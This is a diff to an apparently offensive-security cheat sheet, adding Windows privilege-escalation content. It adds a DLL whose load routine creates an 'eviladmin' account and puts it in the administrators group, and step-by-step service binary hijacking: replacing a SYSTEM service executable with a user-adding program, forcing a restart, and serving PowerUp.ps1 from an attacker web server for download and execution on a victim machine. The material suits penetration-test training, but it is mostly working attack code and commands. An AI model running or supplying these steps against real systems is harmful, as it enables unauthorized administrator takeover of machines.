@@ -174,6 +174,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Hot Potato](#hot-potato)
     - [Token Impersonation](#token-impersonation)
     - [getsystem](#getsystem)
+    - [Service Binary Hijacking](#service-binary-hijacking)
   - [Buffer Overflow](#buffer-overflow)
   - [Antivirus Evasion](#antivirus-evasion)
     - [ToDo](#todo)
@@ -3092,18 +3093,26 @@ Library files consist of three major parts written in XML to specify the paramet
 ```c++
 #include <windows.h>
 
-BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    switch (dwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        MessageBox(NULL,
-            "success!!",
-            "pwned",
-            MB_ICONERROR | MB_OK
-        );
-        break;
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason) {
+        case DLL_PROCESS_ATTACH:
+            // Perform initialization tasks for the DLL when it is loaded
+	    
+	    int i;
+  	    i = system ("net user eviladmin Ev!lpass /add");
+  	    i = system ("net localgroup administrators eviladmin /add");
+	    
+            break;
+        case DLL_PROCESS_DETACH:
+            // Perform cleanup tasks for the DLL when it is unloaded
+            break;
+        case DLL_THREAD_ATTACH:
+            // Perform initialization tasks for each new thread that loads the DLL
+            break;
+        case DLL_THREAD_DETACH:
+            // Perform cleanup tasks for each thread that unloads the DLL
+            break;
     }
-
     return TRUE;
 }
 ```
@@ -4037,13 +4046,12 @@ UAC Bypass with `fodhelper.exe`, a Microsoft support application responsible for
 
 #### <ins>Insecure File Permissions</ins>
 
-Exploit insecure file permissions on services that run as nt authority\system
+Also called "Service Binary Hijacking". Exploit insecure file permissions on services that run as nt authority\system
 1. List running services on Windows using PowerShell `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
-2. Notice services installed in the Program Files directory, this means that it's user-installed (for this example, Serviio)
-3. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
+2. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
    - For this scenario, any user (BUILTIN\Users) on the system has full read and write access to it
    - See also "[Serviio PRO 1.8 DLNA Media Streaming Server - Local Privilege Escalation](https://www.exploit-db.com/exploits/41959)"
-4. Substitute `ServiioService.exe` with the following
+3. Substitute `ServiioService.exe` with the following
    ```C
    #include <stdlib.h>
    int main () {
@@ -4053,14 +4061,23 @@ Exploit insecure file permissions on services that run as nt authority\system
      return 0;
    }
    ```
-   - `i686-w64-gcc adduser.c -o adduser.exe`
+   - `i686-w64-gcc adduser.c -o adduser.exe` or `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` to Cross-Compile the C Code to a 64-bit application
    - `move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
    - `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"`
    - `dir "C:\Program Files\Serviio\bin\"`
-5. Restart the service, here's two options
+4. Restart the service, here's two options
    - `net stop Serviio`
-   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`. If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
-6. Check if it worked with `net localgroup Administrators`
+   - `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'Serviio'}` Obtain Startup Type for Serviio service
+   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`
+   - If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
+5. Check if it worked with `net localgroup Administrators`
+
+**PowerUp.ps1**
+1. Check [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) and make it available with `python3 -m http.server 80`
+2. Download it from the victim machine `iwr -uri http://<IP>/PowerUp.ps1 -Outfile PowerUp.ps1`
+3. Run the commands `powershell -ep bypass` and `. .\PowerUp.ps1`
+4. Then run `Get-ModifiableServiceFile` to display services the current user can modify
+5. Run `Install-ServiceBinary -Name 'mysql'`. If it throws an error even if you already know that the current user has full access permissions on the service binary, proceed with manual exploitation
 
 
 #### <ins>Registry</ins>
